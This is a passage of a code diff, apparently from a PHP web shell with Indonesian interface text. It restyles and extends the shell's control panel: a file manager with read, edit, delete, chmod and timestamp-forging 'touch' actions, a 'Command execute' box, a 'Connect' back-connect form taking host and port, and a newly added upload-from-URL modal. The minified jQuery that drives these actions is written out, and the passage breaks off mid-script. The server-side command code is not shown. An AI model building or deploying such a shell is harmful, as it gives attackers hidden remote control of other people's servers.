a:hover{color:var(--bg-success)}.breadcrumb-item+.breadcrumb-item{padding-left:.2rem}.breadcrumb-item+.breadcrumb-item::before{padding-right:.2rem}pre,textarea.form-control{font-size:1em;border:0!important;color:#cfdce8!important}.form-control-sm{height:auto}.form-control:disabled,.form-control[readonly]{background:#272c31;color:#767676}.media.dir svg{margin:auto;padding-right:.5em}.media.file svg{margin:auto;padding:0 .7em 0 .25em}.fsmall{display:block;font-size:1.75vh;color:#61aa64}.bg-success-rgb,.input-group-prepend *{background:rgb(var(--bs-success-rgb),10%);border:1px solid rgb(var(--bs-success-rgb),50%);color:rgb(var(--bs-success-rgb),90%)}#hasilcommand *,input[type=text],input[type=text]:active,input[type=text]:focus{background:#343a40;color:#cfdce8}select{background-color:#343a40!important;color:#cfdce8!important}.custom-select{padding:5px 10px;color:#cfdce8;background:url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='4' height='5' viewBox='0 0 4 5'%3e%3cpath fill='%23149232' d='M2 0L0 2h4zm0 5L0 3h4z'/%3e%3c/svg%3e") right .75rem center/8px 10px no-repeat #343a40}.custom-file *{background:#343a40;color:#cfdce8;border:1px solid rgb(var(--bs-success-rgb),50%)}.custom-file-label::after{content:"Upload";color:var(--success);background:#2b2f34}#hasilcommand .card{border-radius:.25rem;border:1px solid rgb(var(--bs-success-rgb),50%)}#hasilcommand .card .card-body{border-radius:.25rem}.text-success{color:rgb(0,212,51,90%)!important}.text-cyan{color:var(--cyan)!important;color:#eee}@media screen and (max-width:420px){nav .nav-tabs .nav-link{padding:.5rem 1rem;letter-spacing:-.1em}.btn{padding:0 10px!important}}@media screen and (max-width:767px){body{padding-top:4rem}.container{max-width:100%!important}.blockquote,.btn,.input-group-text,body{font-size:.8em!important}.fsmall{font-size:1.5vh}.form-control-sm{font-size:initial;height:auto}.custom-select{font-size:inherit;height:auto!important}.custom-file,.custom-file-input,.custom-file-label{height:calc(1.5em + .75rem)!important}}</style>
 	</head>
 	<body>
-		<header class="header bg-dark fixed-top mt-auto py-md-3 py-2">
-			<div class="container text-center my-2">
-				<span class="text-light"><?php echo $stitle;?></span>
+		<header class="header bg-dark fixed-top mt-auto py-1">
+			<div class="container my-2">
+				<span class="text-light"><img src="<?php echo fType('logo');?>" class="mr-2" style="width:20px;"/><?php echo $stitle;?></span>
+				<div class="d-block float-right">
+					<a href="?act=logout"><?php echo fType('out','1em');?></a>
+				</div>
 			</div>
 		</header>
 		<div class="container">
 			<nav>
-				<div class="nav nav-tabs" id="nav-tab" role="tablist">
-					<button class="nav-link active" id="fmanager" data-toggle="tab" data-target="#nav-berkas" data-tempdir="<?php echo $_SESSION['path'];?>" type="button" role="tab" aria-controls="nav-berkas" aria-selected="true">
-						<span class="d-block d-sm-none"><?php echo fType('dir','1.2em');?></span>
-						<span class="d-none d-sm-block">Files</span>
+				<div class="nav nav-tabs nav-justified" id="nav-tab" role="tablist">
+					<button class="nav-link d-flex justify-content-center align-items-center active" id="fmanager" data-toggle="tab" data-target="#nav-berkas" data-tempdir="<?php echo $_SESSION['path'];?>" type="button" role="tab" aria-controls="nav-berkas" aria-selected="true">
+						<?php echo fType('dir','1.2em');?><span class="d-none d-sm-block ml-2">Files</span>
 					</button>
-					<button class="nav-link" data-toggle="tab" data-target="#nav-cmd" type="button" role="tab" aria-controls="nav-cmd" aria-selected="false">
-						<span class="d-block d-sm-none"><?php echo fType('cmd','1em');?></span>
-						<span class="d-none d-sm-block">Command</span>
+					<button class="nav-link d-flex justify-content-center align-items-center" data-toggle="tab" data-target="#nav-cmd" type="button" role="tab" aria-controls="nav-cmd" aria-selected="false">
+						<?php echo fType('cmd','1em');?><span class="d-none d-sm-block ml-2">Command</span>
 					</button>
-					<button class="nav-link" data-toggle="tab" data-target="#nav-bc" type="button" role="tab" aria-controls="nav-bc" aria-selected="false">
-						<span class="d-block d-sm-none"><?php echo fType('bc','1.2em');?></span>
-						<span class="d-none d-sm-block">Connect</span>
+					<button class="nav-link d-flex justify-content-center align-items-center" data-toggle="tab" data-target="#nav-bc" type="button" role="tab" aria-controls="nav-bc" aria-selected="false">
+						<?php echo fType('bc','1.2em');?><span class="d-none d-sm-block ml-2">Connect</span>
 					</button>
-					<button class="nav-link" data-toggle="tab" data-target="#nav-info" type="button" role="tab" aria-controls="nav-info" aria-selected="false">
-						<span class="d-block d-sm-none"><?php echo fType('info','1.2em');?></span>
-						<span class="d-none d-sm-block">Info</span>
+					<button class="nav-link d-flex justify-content-center align-items-center" data-toggle="tab" data-target="#nav-info" type="button" role="tab" aria-controls="nav-info" aria-selected="false">
+						<?php echo fType('info','1.2em');?><span class="d-none d-sm-block ml-2">Info</span>
 					</button>
-					<a class="nav-link ml-auto bg-danger text-white" href="?act=logout" type="button" style="border:1px solid var(--cyan) !important;"><span class="d-block"><?php echo fType('out','1.2em');?></span></a>
 				</div>
 			</nav>
-			<div class="row mt-3 mb-n3" id="fberkas">
-				<?php
-				$drives = "";
-				if($GLOBALS['os'] == 'win'){
-					foreach(range('C','Z') as $drive){
-						if(@is_dir($drive.':\\')){
-							$drives .= '<a href="javascript:void(0);" id="chdrive" data-path="'.$drive.':/" class="text-light font-weight-bold">[ '.$drive.' ]</a> ';
-						}						
-					}
-					echo "<div class='col-12 mt-n2 mb-2 text-success'><small>Drives: ".$drives."</small></div>";
-				}?>
-			</div>
 			<div class="tab-content mt-3" id="nav-tabContent">
 				<div class="tab-pane show active fade" id="nav-berkas" role="tabpanel">
 					<div class="form-row">
-						<div class="col-sm-6 col-md-6 col-lg-4">
-							<form method="post" action="?act=mkdir" class="mb-3" id="rqmkdir">
-								<input type="hidden" name="xpath" value=""/>
-								<div class="input-group">
-									<select class="custom-select border-success" name="xtype" style="max-width:110px;">
-										<option value="dir" selected>New dir</option>
-										<option value="file">New file</option>
-									</select>
-									<input type="text" name="xdir" class="form-control form-control-sm border-success" max-length="50"></input>
-									<div class="input-group-append"><button class="btn btn-outline-success" type="submit">Go</button></div>
-								</div>
-							</form>
+						<div class='col-12 mb-3'>
+							<div class="row mb-n3" id="fberkas">
+								<?php
+								$drives = "";
+								if($GLOBALS['os'] == 'win'){
+									foreach(range('C','Z') as $drive){
+										if(@is_dir($drive.':\\')){
+											$drives .= '<a href="javascript:void(0);" id="chdrive" data-path="'.$drive.':/" class="text-light font-weight-bold">[ '.$drive.' ]</a> ';
+										}						
+									}
+									echo "<div class='col-12 mt-n2 mb-2 text-success'><small>Drives: ".$drives."</small></div>";
+								}?>
+							</div>
 						</div>
-						<div class="col-sm-6 col-md-6 col-lg-4">
-							<form method="post" action="?act=upload" class="mb-3" id="rqupload">
-								<input type="hidden" name="xpath" value=""/>
-								<div class="input-group">
-									<div class="custom-file">
-										<label class="custom-file-label" for="titupl">Upload file</label>
-										<input type="file" name="xfile[]" class="custom-file-input border-success" id="titupl" aria-describedby="upld" multiple></input>
-									</div>
-								</div>
-							</form>
-						</div>
-						<div class="col-sm-12 col-md-12 col-lg-4">
-							<form method="post" action="?act=readfile" class="mb-3" id="rqreadfile">
-								<div class="input-group">
-									<div class="input-group-prepend">
-										<label class="input-group-text">ReadFile</label>
-									</div>
-									<input type="text" name="xpath" class="form-control form-control-sm border-success"></input>
-									<div class="input-group-append"><button class="btn btn-outline-success" type="submit">Go</button></div>
-								</div>
-							</form>
-						</div>
-						<div class='col-12 mb-3' id="fileman"></div>
+						<div class="col-12"><div class="row" id="fileman"></div></div>
 					</div>
 				</div>
 				<div class="tab-pane fade" id="nav-cmd" role="tabpanel">
-					<div class="row">
+					<div class="row" style="margin-top:-7.5px;">
 						<div class="col-12">
+							<span>Command execute</span>
 							<form method="post" action="?act=command" class="mb-3" id="rqcmd">
 								<input type="hidden" name="xpath" value=""></input>
-								<span>Command execute</span>
 								<div class="input-group mt-2">
 									<input type="text" class="form-control form-control-sm border-success" name="cmd" placeholder="uname -a"></input>
 									<div class="input-group-append"><button class="btn btn-sm btn-outline-success" type="submit">Go</button></div>
@@ -980,13 +1021,13 @@ if(!isset($_SESSION['auth'])){
 									<input type="text" name="bhost" class="form-control form-control-sm border-success" placeholder="127.0.0.1"></input>
 								</div>
 							</div>
-							<div class="col-sm-12 col-md-6 col-lg-4 mb-3">
+							<div class="col-6 col-lg-4 mb-3">
 								<div class="input-group">
 									<div class="input-group-prepend"><label class="input-group-text">Port</label></div>
 									<input type="text" name="bport" class="form-control form-control-sm border-success" placeholder="1337"></input>
 								</div>
 							</div>
-							<div class="col-sm-12 col-md-6 col-lg-4 mb-3">
+							<div class="col-6 col-lg-4 mb-3">
 								<div class="input-group">
 									<div class="input-group-prepend"><label class="input-group-text">Using</label></div>
 									<select class="form-control form-control-sm border-success" name="btype">
@@ -1007,6 +1048,54 @@ if(!isset($_SESSION['auth'])){
 				</div>
 			</div>
 			<div class="position-fixed top-0 right-0 p-3" id="shownotif" style="z-index:1031; right:0; top:0;"></div>
+		</div>
+		<div class="modal fade" id="uploadtypefile" data-backdrop="static" data-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
+			<div class="modal-dialog modal-dialog-centered modal-dialog-scrollable modal-lg">
+				<div class="modal-content bg-dark">
+					<div class="modal-header bg-dark border-secondary">
+						<h6 class="modal-title text-break text-light" id="staticBackdropLabel">Upload file <span class="d-block mt-n1" style="font-size:11px;">from: local storage</span></h6>
+						<button type="button" class="close text-light" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+					</div>
+					<div class="modal-body">
+						<form method="post" action="?act=upload" id="rqupload">
+							<input type="hidden" name="xpath" value=""/>
+							<div class="input-group">
+								<div class="custom-file">
+									<label class="custom-file-label" for="titupl">Choose files</label>
+									<input type="file" name="xfile[]" class="custom-file-input border-success" id="titupl" aria-describedby="upld" multiple></input>
+								</div>
+							</div>
+						</form>
+						<div class="mt-2 small text-warning text-center font-italic">available multiple files</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="modal fade" id="uploadtypeurl" data-backdrop="static" data-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
+			<div class="modal-dialog modal-dialog-centered modal-dialog-scrollable modal-lg">
+				<div class="modal-content bg-dark">
+					<div class="modal-header bg-dark border-secondary">
+						<h6 class="modal-title text-break text-light" id="staticBackdropLabel">Upload file <span class="d-block mt-n1" style="font-size:11px;">from: url</span></h6>
+						<button type="button" class="close text-light" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+					</div>
+					<div class="modal-body">
+						<form method="post" action="?act=uploader" id="rquploader">
+							<input type="hidden" name="xpath" value=""></input>
+							<div class="input-group mb-3">
+								<div class="input-group-prepend"><label class="input-group-text">Link</label></div>
+								<input type="text" class="form-control border-success" id="xurl" name="xurl" value=""/>
+							</div>
+							<div class="input-group">
+								<div class="input-group-prepend"><label class="input-group-text">Name</label></div>
+								<input type="text" class="form-control border-success" id="xname" name="xname" value=""/>
+								<div class="input-group-append">
+									<button class="btn btn-outline-success" type="submit">GO</button>
+								</div>
+							</div>
+						</form>
+					</div>
+				</div>
+			</div>
 		</div>
 		<div class="modal fade" id="modalshowaksi" data-backdrop="static" data-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
 			<div class="modal-dialog modal-dialog-centered modal-dialog-scrollable modal-lg">
@@ -1054,7 +1143,7 @@ if(!isset($_SESSION['auth'])){
 				</div>
 			</div>			
 		</div>
-		<footer class="footer bg-dark mt-auto py-md-3 py-2">
+		<footer class="footer bg-dark mt-auto py-2">
 			<div class="container">
 				<blockquote class="blockquote text-center mb-0">
 					<span class="text-secondary small"><?php echo $sfooter;?></span>
@@ -1063,7 +1152,7 @@ if(!isset($_SESSION['auth'])){
 		</footer>
 		<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js" integrity="sha512-3gJwYpMe3QewGELv8k/BX9vcqhryRdzRMxVfq6ngyWXwo03GFEzjsUm8Q7RZcHPHksttq7/GFoxjCVUjkjvPdw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 		<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/js/bootstrap.bundle.min.js" integrity="sha512-igl8WEUuas9k5dtnhKqyyld6TzzRjvMqLC79jkgT3z02FvJyHAuUtyemm/P/jYSne1xwFI06ezQxEwweaiV7VA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-		<script>!function(t){var e='<div class="mb-3 bg-transparent"><?php echo fType('loader','1.5em');?>Tunggu bentar...</div>';let a={bs64ToBit:function(t){let e=atob(t);return Uint8Array.from(e,t=>t.codePointAt(0))},btTobs64:function(t){let e=String.fromCodePoint(...t);return btoa(e)},isWellFormed:function(t){if(void 0!==t)return t.isWellFormed();try{return encodeURIComponent(t),!0}catch(e){return!1}},encode:function(t){return a.isWellFormed(t)?a.btTobs64(new TextEncoder().encode(t)):""},decode:function(t){return a.isWellFormed(t)?new TextDecoder().decode(a.bs64ToBit(t)):""}},n=(e,a)=>{t("#shownotif").html('<div id="liveToast" class="toast hide" role="alert" aria-live="assertive" aria-atomic="true" data-delay="10000"><div class="toast-header"><img src="<?php echo fType('logo');?>" width="20" class="rounded mr-2" alt="icon"/><strong class="mr-auto">'+e+'</strong><button type="button" class="ml-2 mb-1 close" data-dismiss="toast" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="toast-body text-secondary">'+a+"</div></div>"),t(".toast").toast("show")};function o(a,o,i,r){var d=t("#modalshowaksi").find(".modal-body");t.ajax({type:"get",url:"?act=path&dir="+o+"&entry="+i+"&opt="+a,beforeSend:function(){d.html(e)}}).done(function(t){d.html(""),r(t)}).fail(function(t,e,a){n("Error",t.status),d.html("error_code: "+t.status)})}function i(e){for(var a=0;a<e.length;a++)e[a].addEventListener("change",function(e){var a=t("option:selected",this)[0],i=a.value,r=t("#modalshowaksi"),d="",l="",s="",m=a.attributes["data-xtype"],f=a.attributes["data-xname"],u=a.attributes["data-xpath"],c=e.currentTarget;if(i.length>0){switch(r.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),i){case"rename":l="Rename "+m.value.toUpperCase()+" /"+f.value,d='<form method="post" action="?act=rename" id="rqrename"><input type="hidden" name="xtype" value="'+m.value+'"/><input type="hidden" name="xpath" value="'+u.value+'"/><div class="form-group row mb-0"><label for="xname" class="col-sm-2 col-form-label">'+("dir"==m.value?"Directory":"File")+'</label><div class="col-sm-10"><div class="input-group mb-3"><input type="text" class="form-control border-success" id="xname" name="xname" value="'+f.value+'" autofocus/><div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div></div></div></div></form>',s="";break;case"touch":l="Touch "+m.value.toUpperCase()+" /"+f.value,d='<form method="post" action="?act=touch" id="rqtouch"><input type="hidden" name="xtype" value="'+m.value+'"/><input type="hidden" name="xpath" value="'+u.value+'"/><input type="hidden" name="xname" value="'+f.value+'"/><div class="form-group row"><label for="xtime" class="col-sm-2 col-form-label">Datetime</label><div class="col-sm-10"><div class="input-group"><input type="text" class="form-control border-success" id="xtime" name="xtime" value="'+a.attributes["data-xtime"].value+'" autofocus/><div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div></div></div></div></form>',s=""}"download"==i?window.open("?act=path&dir="+u.value+"&entry="+f.value+"&opt="+i,"_blank"):"del"==i||"zip"==i||"unzip"==i?(r.modal("show"),r.find(".modal-title").html(i+" /"+f.value),r.find(".modal-body").html('<form method="post" action="?act='+i+'" id="rq'+i+'" class="text-center"><input type="hidden" name="xtype" value="'+m.value+'"/><input type="hidden" name="xname" value="'+f.value+'"/><input type="hidden" name="xpath" value="'+u.value+'"/><div class="alert alert-info m-n3 rounded-0">Klik proses utk melanjutkan!!</div>'),r.find(".modal-footer").removeClass("d-none").addClass("d-flex justify-content-center").html('<button class="btn btn-success" type="submit">Proses!</button></form>'),r.on("hidden.bs.modal",function(t){r.find(".modal-title").html("unknown"),r.find(".modal-body").html("null"),r.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),c.value=""})):"edit"==i?(r.modal("show"),r.find(".modal-body").addClass("p-0"),r.find(".modal-title").html("Edit "+m.value.toUpperCase()+": /"+f.value),o("view",u.value,f.value,function(t){var e='<form method="post" action="?act=path&dir='+u.value+"&entry="+f.value+'&opt=edit" id="rqeditfile"><textarea name="xdata" class="form-control rounded-0" style="white-space:pre;background:#2b2f34;" rows="30">'+t+"</textarea>";r.find(".modal-body").html(e),r.find(".modal-footer").removeClass("d-none").addClass("d-flex justify-content-center").html('<button class="btn btn-success text-center" type="submit">Simpan</button></form>'),setTimeout(()=>r.find(".modal-body textarea").focus(),300)}),r.on("hidden.bs.modal",function(t){r.find(".modal-title").html("unknown"),r.find(".modal-body").removeClass("p-0").html("null"),r.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),c.value=""})):"view"==i?(r.modal("show"),r.find(".modal-title").html("View "+m.value.toUpperCase()+": /"+f.value),o("view",u.value,f.value,function(t){r.find(".modal-body").attr("style","background:#2b2f34;").addClass("rounded-0").html('<pre class="mb-0">'+t+"</pre>"),r.find(".modal-footer").removeClass("d-none").addClass("d-flex justify-content-center").html('<button type="button" class="btn btn-danger text-center" data-dismiss="modal" aria-label="Close">Tutup</button>')}),r.on("hidden.bs.modal",function(t){r.find(".modal-title").html("unknown"),r.find(".modal-body").attr("style","").removeClass("rounded-0").html("null"),r.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),c.value=""})):(r.modal("show"),r.find(".modal-title").html(l),r.find(".modal-body").html(d),r.on("hidden.bs.modal",function(t){r.find(".modal-title").html("unknown"),r.find(".modal-body").html("null"),c.value=""}))}else n("Error","Invalid request!")},!1)}function r(o,i){t.ajax({type:"get",url:"?act=path&dir="+o,timeout:5e3,beforeSend:function(){t("#fileman").html(e),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()}}).done(function(e,n,r){t("#fileman").html(a.decode(e)),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(o),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o),t("button#fmanager").attr("data-tempdir",o),i(e)}).fail(function(e,a,i){t("#fileman").html(a+", response code: "+e.status),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide(),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o),t("button#fmanager").attr("data-tempdir",o),n("Error",a+", response code: "+e.status)})}t(document).on("click","a#chdrive",function(n){n.preventDefault();var o=t(n.currentTarget).attr("data-path");t.ajax({type:"get",url:"?act=path&dir="+o,beforeSend:function(){t("body").find("#fileman").html(e),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()},success:function(e){t("body").find("#fileman").html(a.decode(e)),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(o),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o)}}).done(function(){i(document.querySelectorAll("#showaksi")),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o),t("form#rqcmd").parent().find("#hasilcommand").html("")})}),t(document).on("click","a#chdir",function(e){e.preventDefault();var a=t(e.currentTarget).attr("data-path");t("ol.breadcrumb").addClass("pl-0").css({background:"transparent",padding:"0"}).html('<li class="breadcrumb-item w-100 active">					<form method="post" action="?act=changedir" class="mb-0" id="rqchdir">						<div class="input-group">							<input type="text" name="xpath" class="form-control form-control-sm border-success" value="'+a+'" autofocus></input>							<div class="input-group-append">								<button class="btn btn-success" type="submit">Go</button>							</div>						</div>					</form></li>')}),t("button#fmanager").on("click",function(n){n.preventDefault();var o=t(n.currentTarget).attr("data-tempdir");t.ajax({type:"get",url:"?act=path&dir="+o,beforeSend:function(){t("body").find("#fileman").html(e),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()},success:function(e){t("body").find("#fileman").html(a.decode(e)),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(o),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o)}}).done(function(){i(document.querySelectorAll("#showaksi")),t("form#rqcmd, form#rqbc").find('input[name="xpath"]').val(o),t("form#rqcmd").parents().find("#hasilcommand").html("")})}),t("button#fmanager").trigger("click"),t('button[data-target="#nav-cmd"]').on("shown.bs.tab",function(e){t("#hasilcommand").hide()}),t('button[data-target="#nav-berkas"]').on("shown.bs.tab",function(e){t("#fberkas").show()}),t('button[data-target="#nav-berkas"]').on("hidden.bs.tab",function(e){t("#fberkas").hide()}),t('button[data-target="#nav-info"]').on("hidden.bs.tab",function(e){t("#nav-info").find("#showinfo").html("")}),t('button[data-target="#nav-info"]').on("shown.bs.tab",function(a){t.ajax({type:"get",url:"?act=info",dataType:"json",beforeSend:function(){t("#nav-info").find("#showinfo").html(e)}}).done(function(e){try{var a=JSON.parse(JSON.stringify(e)),n=t.map(a,function(t,e){return[t]});t("#nav-info").find("#showinfo").html('<blockquote class="blockquote px-3 pt-n3 pb-3 bg-success-rgb rounded">'+n.join("")+"</blockquote>")}catch(o){t("#nav-info").find("#showinfo").html("Error: Gagal menganalisa server!")}})}),t("#fileman").length>0&&(t("#fileman").on("click","a#ffmanager, button#ffmanager",function(e){e.stopPropagation(),r(t(this).attr("data-path"),function(){i(document.querySelectorAll("#showaksi"))})}),t("#fileman").on("click","a#fxmanager",function(e){e.stopPropagation(),r(t(this).attr("data-path"),function(){i(document.querySelectorAll("#showaksi"))})})),t("#showchmod").on("show.bs.modal",function(e){var a=t(e.relatedTarget),n=t(this).find(".modal-body"),o=a.attr("data-xtype"),i=a.attr("data-xname"),r=a.attr("data-xpath"),d=a.attr("data-xperm");n.find('input[name="xtype"]').val(o),n.find('input[name="xname"]').val(i),n.find('input[name="xpath"]').val(r),n.find('input[name="xperm"]').val(d).focus(),n.find('input[id="xname"]').val(i),n.find('label[for="xname"]').css("text-transform","capitalize").html("dir"==o?"Directory":"File")}),t.each(["rqdel","rqzip","rqunzip","rqrename","rqtouch","rqchmod","rqreadfile","rqeditfile","rqnewfile","rqbc"],function(o,i){t(document).on("submit","form#"+i,function(o){o.preventDefault();var r=t(this),d=t("#modalshowaksi");if(r.find('button[type="submit"]').prop("disabled",!0),"rqrename"==i||"rqtouch"==i)r.find('input[readonly="readonly"]').prop("readonly",!1);else if("rqeditfile"==i||"rqnewfile"==i)var l=a.encode(r.find('textarea[name="xdata"]').val());else if("rqbc"==i){var s=r.find('input[name="bhost"]').val(),m=r.find('input[name="bport"]').val();if(r.find('input[name="btype"]').val(),t("body").find("#showbc").remove(),s.length<=0||m.length<=0)return n("Opss!","Server dan port gak boleh dikosongin!"),r.find('button[type="submit"]').prop("disabled",!1),!1}else if("rqreadfile"==i){var f=r.find('input[name="xpath"]').val();if(f.length<1)return n("Opss!","Isi dulu nama filenya pak!"),!1;d.modal("show"),d.find(".modal-title").html("View FILE: "+f),r.find('button[type="submit"]').prop("disabled",!1)}t.ajax({type:"post",url:r.attr("action"),data:"rqeditfile"==i||"rqnewfile"==i?{xdata:l}:r.serialize(),beforeSend:function(){t("rqbc"==i?'<div class="row" id="showbc"><div class="col-12 mb-3">'+e+"</div></div>":e).insertAfter(r)}}).done(function(e){r.parent().find("div.bg-transparent").remove(),r.find('button[type="submit"]').prop("disabled",!1),"rqreadfile"==i?(d.find(".modal-body").html('<pre class="pre-scrollable mb-0">'+e+"</pre>"),d.find(".modal-footer").html("")):"rqbc"==i?t("#showbc div").html('<pre class="pre-scrollable mb-0">'+e+"</pre>"):("rqrename"==i||"rqtouch"==i?r.find('input[readonly="readonly"]').prop("readonly",!0):"rqchmod"==i&&t("body").find("#showchmod").modal("hide"),d.modal("hide"),n("Alert",e));var a=t("#fileman").find("a#ffmanager");a[a.length-1].click(function(t){t.stopPropagation()})})})}),t(document).on("submit","form#rqchdir",function(e){e.preventDefault();var a=t(this),o=a.find('input[name="xpath"]').val();o.length<1?n("Opss!","Isi dulu nama direktorinya pak!"):(a.find('button[type="submit"]').prop("disabled",!0),r(o,function(){var t=document.querySelectorAll("#showaksi");t.length>0?i(t):n("Error","Direktori tidak ada/ tidak berisi file apapun!")}),a.find('button[type="submit"]').prop("disabled",!1))}),t(document).on("submit","form#rqmkdir",function(a){a.preventDefault();var o=t(this),i=o.find('input[name="xdir"]').val();if(i.length<1)n("Error","Isi dulu nama direktorinya pak!");else if("file"==o.find(":selected").val()){var r=t("#modalshowaksi"),d=o.find('input[name="xpath"]').val();r.modal("show"),r.find(".modal-title").text("FileName: "+i),r.find(".modal-body").html('<form method="post" action="?act=path&dir='+d+"&entry="+i+'&opt=newfile" id="rqnewfile"><div class="d-block mb-3"><textarea name="xdata" class="form-control" style="white-space:pre;" rows="20" placeholder="tulis seperlunya..." autofocus></textarea></div><center><button class="btn btn-success text-center" type="submit">Simpan</button></center></form>')}else o.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:o.attr("action"),data:o.serialize(),beforeSend:function(){t(e).insertAfter(o)},success:function(e){o.next("span").remove(),o.find('button[type="submit"]').prop("disabled",!1),n("Alert",e);var a=t("#fileman").find("a#ffmanager");a[a.length-1].click(function(t){t.stopPropagation()}),o.next("span#notify").fadeTo(3e3,500).slideUp(500,function(){t(this).slideUp(500)})}})}),t('input[type="file"]').on("change",function(){t("form#rqupload").submit()}),t(document).on("submit","form#rqupload",function(e){e.preventDefault();var a=t(this),o=a.find('input[name="xfile[]"]').prop("files");if(o&&o.length<=0||o.size<1)n("Error","File kosong, gak ada isinya!");else{var i=new FormData(this);a.find('button[type="submit"]').prop("disabled",!0),i.append("xfile",o),t.ajax({type:"post",url:a.attr("action"),data:i,dataType:"text",contentType:!1,processData:!1,beforeSend:function(){a.next("span").remove()},success:function(e){a[0].reset(),a.next("span").remove(),a.find('button[type="submit"]').prop("disabled",!1),n("Alert",e);var o=t("#fileman").find("a#ffmanager");o[o.length-1].click(function(t){t.stopPropagation()})}})}}),t(document).on("submit","form#rqcmd",function(n){n.preventDefault();var o=t(this);o.parents().find("#hasilcommand").show(),o.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:o.attr("action"),data:o.serialize(),dataType:"json",beforeSend:function(){o.parents().find("#hasilcommand").html(e)},success:function(t){var e=JSON.parse(JSON.stringify(t));o.find('input[name="xpath"]').val(a.decode(e.path)),o.find('button[type="submit"]').prop("disabled",!1),o.parents().find("#hasilcommand").html('<div class="card mb-3"><div class="card-body p-2 font-weight-light">'+a.decode(e.stdout)+"</div></div>")},error:function(t,e,a){o.find('button[type="submit"]').prop("disabled",!1),o.parents().find("#hasilcommand").html('<div class="card mb-3"><div class="card-body p-2 font-weight-light">'+e+": "+a+"</div></div>")}}).done(function(e){var n=JSON.parse(JSON.stringify(e));t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile,form#rqbc").find('input[name="xpath"]').val(a.decode(n.path)),t.each(t("button[data-tempdir]"),function(e,o){t(o).attr("data-tempdir",a.decode(n.path))}),t.each(t("a#fxmanager"),function(e,o){t(o).attr("data-path",a.decode(n.path))})})})}(jQuery);</script>
+		<script>!function(t){var e='<div class="mb-3 bg-transparent"><?php echo fType('loader','1.5em');?> Tunggu bentar...</div>';let a={bs64ToBit:function(t){let e=atob(t);return Uint8Array.from(e,t=>t.codePointAt(0))},btTobs64:function(t){let e=String.fromCodePoint(...t);return btoa(e)},isWellFormed:function(t){if(void 0!==t)return t.isWellFormed();try{return encodeURIComponent(t),!0}catch(e){return!1}},encode:function(t){return a.isWellFormed(t)?a.btTobs64(new TextEncoder().encode(t)):""},decode:function(t){return a.isWellFormed(t)?new TextDecoder().decode(a.bs64ToBit(t)):""}},n=(e,a)=>{t("#shownotif").html('<div id="liveToast" class="toast hide" role="alert" aria-live="assertive" aria-atomic="true" data-delay="5000"><div class="toast-header"><img src="<?php echo fType('logo');?>" width="20" class="rounded mr-2" alt="icon"/><strong class="mr-auto">'+e+'</strong><button type="button" class="ml-2 mb-1 close" data-dismiss="toast" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="toast-body text-secondary">'+a+"</div></div>"),t(".toast").toast("show")};function o(a,o,i,r){var d=t("#modalshowaksi").find(".modal-body");t.ajax({type:"get",url:"?act=path&dir="+o+"&entry="+i+"&opt="+a,beforeSend:function(){d.html(e)}}).done(function(t){d.html(""),r(t)}).fail(function(t,e,a){n("Error",t.status),d.html("error_code: "+t.status)})}function i(e){for(var a=0;a<e.length;a++)e[a].addEventListener("change",function(e){var a=t("option:selected",this)[0],i=a.value,r=t("#modalshowaksi"),d="",l="",s="",f=a.attributes["data-xtype"],m=a.attributes["data-xname"],u=a.attributes["data-xpath"],c=e.currentTarget;if(i.length>0){switch(r.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),i){case"rename":l="Rename "+f.value.toUpperCase()+" /"+m.value,d='<form method="post" action="?act=rename" id="rqrename"><input type="hidden" name="xtype" value="'+f.value+'"/><input type="hidden" name="xpath" value="'+u.value+'"/><div class="form-group row mb-0"><label for="xname" class="col-sm-2 col-form-label">'+("dir"==f.value?"Directory":"File")+'</label><div class="col-sm-10"><div class="input-group mb-3"><input type="text" class="form-control border-success" id="xname" name="xname" value="'+m.value+'" autofocus/><div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div></div></div></div></form>',s="";break;case"touch":l="Touch "+f.value.toUpperCase()+" /"+m.value,d='<form method="post" action="?act=touch" id="rqtouch"><input type="hidden" name="xtype" value="'+f.value+'"/><input type="hidden" name="xpath" value="'+u.value+'"/><input type="hidden" name="xname" value="'+m.value+'"/><div class="form-group row"><label for="xtime" class="col-sm-2 col-form-label">Datetime</label><div class="col-sm-10"><div class="input-group"><input type="text" 